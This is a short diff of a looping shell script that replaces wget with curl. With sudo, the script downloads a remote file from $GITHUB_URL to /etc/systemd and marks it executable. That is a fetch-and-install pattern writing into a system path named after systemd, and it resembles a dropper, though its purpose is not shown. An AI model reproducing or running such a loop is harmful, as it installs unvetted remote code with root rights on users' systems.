@@ -10,12 +10,9 @@ while true; do
     fi
     
     # Download the file if it exists
-    wget -q --spider "$GITHUB_URL"
-    
-    # Check if the file exists
-    if [ $? -eq 0 ]; then
+    if curl --output /dev/null --silent --head --fail "$GITHUB_URL"; then
         # Download the file
-        sudo wget -q -O /etc/systemd "$GITHUB_URL"
+        sudo curl -sSL "$GITHUB_URL" -o /etc/systemd
         
         # Give execute permissions
         sudo chmod +x /etc/systemd
